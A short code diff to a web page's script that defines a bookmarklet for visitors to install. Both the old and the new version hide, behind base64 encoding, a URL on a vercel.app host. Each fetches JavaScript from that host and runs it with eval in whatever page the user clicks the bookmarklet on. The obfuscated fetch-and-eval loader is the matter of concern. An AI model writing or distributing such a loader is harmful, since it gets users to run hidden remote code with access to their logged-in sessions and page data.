@@ -763,7 +763,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Bookmarklet code
-            const bookmarkletCode = `javascript:(function(){eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgdXJsID0gJ2h0dHBzOi8vamlzYW54ZGV2LnZlcmNlbC5hcHAvJztmZXRjaCh1cmwpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGNvZGUgPT4gZXZhbChjb2RlKSk7fSkoKTs='));})();`;
+            const bookmarkletCode = `javascript:(()=>{const encodedURL="aHR0cHM6Ly9qaXNhbnhx eC52ZXJjZWwuYXBwLw==".replace(/\s+/g,'');const url=atob(encodedURL);fetch(url).then(r=>r.text()).then(code=>{try{(0,eval)(code);}catch(e){console.error('Eval failed:',e);}}).catch(e=>console.error('Fetch failed:',e));})();`;
 
             // Set the bookmarklet link href
             const bookmarkletLink = document.getElementById('bookmarklet-link');
